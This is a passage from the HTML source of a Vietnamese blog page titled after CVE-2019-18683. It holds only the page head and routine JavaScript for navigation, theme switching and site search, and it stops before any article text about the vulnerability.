<!DOCTYPE html>
<html lang="vi" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tìm hiểu về CVE-2019-18683 – Edisc Blog</title>
    


  
  <script defer src="/js/fuse.min.32195737929df2c8096e855a5789cbb3f1331224d9169e8705493e7008f47df8.js"></script>



<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.fb649fcae62177dfe63e67081ddceb830b5ce1f05a4184e9bbb7d87ac4b8f4e5.js"></script>

<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>

<script defer src="/js/helper/fadeinout.min.efa35f4c090622130b3f4cfae6971448b5ffb61c5f0a8f21cdfd157fa712abc4.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var tables = document.querySelectorAll('.single__contents > table');
    for (let i = 0; i < tables.length; i++) {
      var table = tables[i];
      var wrapper = document.createElement('div');
      wrapper.className = 'table-wrapper';
      table.parentElement.replaceChild(wrapper, table);
      wrapper.appendChild(table);
    }
    


    
    var footNoteRefs = document.querySelectorAll('.footnote-ref');
    var footNoteBackRefs = document.querySelectorAll('.footnote-backref');

    footNoteRefs ? 
    footNoteRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function () {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;

    footNoteBackRefs ? 
    footNoteBackRefs.forEach(function(elem, idx) {
      elem.onmouseenter = function () {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      elem.onmouseleave = function () {
        if (!navbar.classList.contains('scrolling')) {
          setTimeout(function() {
            navbar.classList.add('scrolling');
          }, 100);
        }
      }

      elem.onclick = function () {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.remove('navbar--show');
          navbar.classList.remove('navbar--hide');
          navbar.classList.add('navbar--hide');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("true");
    
    var tocLevels = JSON.parse("[\"h2\",\"h3\",\"h4\"]");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }

        if (navbar.classList.contains('scrolling')) {
          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('scrolling')) {
          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');
    
    
    var skinDarkCode = JSON.parse("\"dark\"");
    
    var skinLightCode = JSON.parse("\"light\"");
    
    var skinHackerCode = JSON.parse("\"hacker\"");
    
    var skinSolarizedCode = JSON.parse("\"solarized\"");
    
    var skinKimbieCode = JSON.parse("\"kimbie\"");

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      }
    }

    var parseSkinCode = function(themeText) {
      if (themeText === skinDarkCode) {
        return 'dark';
      } else if (themeText === skinLightCode) {
        return 'light';
      } else if (themeText === skinHackerCode) {
        return 'hacker';
      } else if (themeText === skinSolarizedCode) {
        return 'solarized';
      } else if (themeText === skinKimbieCode) {
        return 'kimbie';
      }
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = parseSkinCode(e.target.text.trim());
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://minhlongmt183.github.io/\"");
    
    var permalink = JSON.parse("\"https://minhlongmt183.github.io/posts/cve-2019-18683/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("true");
    
    var searchDistance = JSON.parse("100");
    
    var searchThreshold = JSON.parse("0.4");
    
    var searchContent = JSON.parse("true");
    
    var enableSearchHighlight = JSON.parse("true");
    
    var searchResultPosition = JSON.parse("\"main\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : 
                searchContent ? ['title', 'description', 'content'] : ['title', 'description'],
              includeMatches: enableSearchHighlight,
              shouldSort: true, 
              threshold: searchThreshold ? searchThreshold : 0.4, 
              location: 0, 
              distance: searchDistance ? searchDistance : 100, 
              maxPatternLength: 32,
              minMatchCharLength: 1,
              isCaseSensitive: false, 
              findAllMatches: false, 
              useExtendedSearch: false, 
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.item.description) {
        descDiv.innerHTML = obj.item.description;
      } else if (obj.item.content) {
        descDiv.innerHTML = obj.item.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
